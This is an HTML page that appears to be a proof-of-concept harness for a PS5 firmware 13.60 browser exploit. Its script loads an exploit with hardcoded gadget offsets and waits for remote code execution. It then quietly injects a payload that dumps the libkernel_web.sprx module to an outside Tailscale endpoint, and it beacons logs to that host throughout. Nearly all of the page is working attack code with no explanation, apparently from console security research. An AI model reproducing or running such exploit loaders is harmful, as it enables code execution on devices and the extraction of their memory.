<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>ds</title>
<style>
body{background:#101418;color:#cfe;margin:0;padding:8px;font:12px/1.5 monospace}
#cap{font-weight:700;font-size:14px}
#cat.ok #status{color:#7f7}#cat.bad #status{color:#f77}#cat.run #status{color:#fc7}
#scr{white-space:pre-wrap;max-height:45vh;overflow:hidden;color:#9bc}
#dumpStatus{color:#fc7;font-weight:700}
</style>
</head>
<body>
<div id="cap">PoC PS5 FW 13.60 (lite7: 23:26-repro — pristine exploit, silent paced payload)</div>
<div id="cat"><span id="status">boot</span></div>
<pre id="scr"></pre>
<div id="dumpStatus">waiting…</div>
<script>
"use strict";
// lite7: exact replication of the 23:26 success conditions:
//  - PRISTINE upstream exploit.js (no telemetry, notify sent, 800ms yield)
//  - zero beacons / zero DOM churn / zero timers during payload memory reads
//  - deliberate multi-second pacing between payload phases
const BUILD_ID = "local-lite7";
const ENDPOINT = "https://adityas-macbook-pro.tailddb851.ts.net/__deepslop/dump";
const PARAMS = "go=1&fw=13.60&scan=0&build=" + BUILD_ID
  + "&hc=0x56a58,0x56ca0,0x57ce8&gd=0x1d6fa&nt=0x48b0"
  + "&gps=0x334e238&gpe=0x1b860&cls=0x334e228&cle=0x274e0&ers=0x334e230&ere=0xf7d0";

const scr = document.getElementById("scr");
const lines = [];
const LOG_URL = "https://adityas-macbook-pro.tailddb851.ts.net/log/";
window.__LITE_LOG_URL = LOG_URL;
// silence switch: flipped on right before the payload loads; from then on
// the page does nothing but the paced payload reads (23:26 conditions)
window.__LITE_SILENT = false;
window.__LITE_QUIET_PAYLOAD = true;
window.onerror = function (msg, src, line, col, err) {
  try { fetch(LOG_URL + encodeURIComponent("PAGEERR " + msg + " @" + line + ":" + col), { cache: "no-store" }).catch(function () { }); } catch (e) { }
};
window.addEventListener("unhandledrejection", function (e) {
  try { fetch(LOG_URL + encodeURIComponent("REJ " + String(e.reason).slice(0, 120)), { cache: "no-store" }).catch(function (e2) { }); } catch (e2) { }
});
window.addLog = function (t) {
  if (!window.__LITE_SILENT) {
    lines.push(String(t).slice(0, 200));
    if (lines.length > 24) lines.splice(0, lines.length - 24);
    scr.textContent = lines.join("\n");
    try { fetch(LOG_URL + encodeURIComponent(String(t).slice(0, 180)), { cache: "no-store" }).catch(function () { }); } catch (e) { }
  }
};
window.setRuntimeStage = function () { };
window.setRuntimeState = function (t) { document.getElementById("status").textContent = t; };
window.setDumpProgress = function () { };  // no DOM churn during dump
window.payOut = function (t) { window.__PAY_BUFFER = (window.__PAY_BUFFER || "") + t + "\n"; };
window.addExploitStatus = function (t, cls) { window.setRuntimeState(t); };
window.setDumpRowStatus = function () { };

let booted = false;
function boot() {
  if (booted) return;
  booted = true;
  const runToken = "lite7-" + Date.now().toString(36);
  window.__DEEPSLOP_ACTIVE_RUN = runToken;
  window.EXPLOIT_PARAMS = new URLSearchParams(PARAMS + "&run=" + runToken);
  addLog("[LITE7] loading kernel-stubs…");
  const s = document.createElement("script");
  s.src = "full/kernel-stubs.js?_=" + Date.now();
  s.onload = function () {
    addLog("[LITE7] loading pristine exploit (notify ON, 800ms yield)…");
    const e = document.createElement("script");
    e.src = "full/exploit.js?" + PARAMS + "&run=" + runToken + "&_=" + Date.now();
    e.onload = function () { addLog("[LITE7] exploit loaded"); };
    e.onerror = function () { addLog("[ERR] exploit failed to load"); };
    document.head.appendChild(e);
  };
  s.onerror = function () { addLog("[ERR] kernel-stubs failed to load"); };
  document.head.appendChild(s);
}

let dumpStarted = false;
(async function waitForRce() {
  if (dumpStarted) return;
  if (window.notifyReady === true && typeof window.aimRead === "function"
      && window.deepslopModuleRegistry) {
    dumpStarted = true;
    // beacon BEFORE going silent (order guaranteed: silent=true after fetch fires)
    try { fetch(LOG_URL + encodeURIComponent("LITE7-RCE-ACTIVE-going-silent"), { cache: "no-store" }).catch(function () { }); } catch (e) { }
    document.getElementById("dumpStatus").textContent = "RCE ACTIVE — payload running (silent)";
    await new Promise(function (r) { setTimeout(r, 1500); });
    window.__LITE_SILENT = true;
    window.__DEEPSLOP_DUMP_REQUEST = {
      module: "libkernel_web.sprx",
      speed: "low",
      mode: "dump",
      endpoint: ENDPOINT,
    };
    const p = document.createElement("script");
    p.src = "payloads/sprx_dump_lite.js?_=" + Date.now();
    p.onload = function () { if (p.parentNode) p.parentNode.removeChild(p); };
    document.body.appendChild(p);
    return;
  }
  setTimeout(waitForRce, 500);
})();

boot();
</script>
</body>
</html>
